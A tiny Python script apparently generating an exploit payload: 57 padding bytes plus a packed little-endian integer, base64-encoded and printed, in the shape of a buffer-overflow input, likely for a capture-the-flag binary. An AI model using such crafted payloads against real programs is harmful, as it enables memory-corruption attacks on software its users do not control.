
import sys
import struct
import base64

buf = b'VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV'
buf += struct.pack('<I', 839268466)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
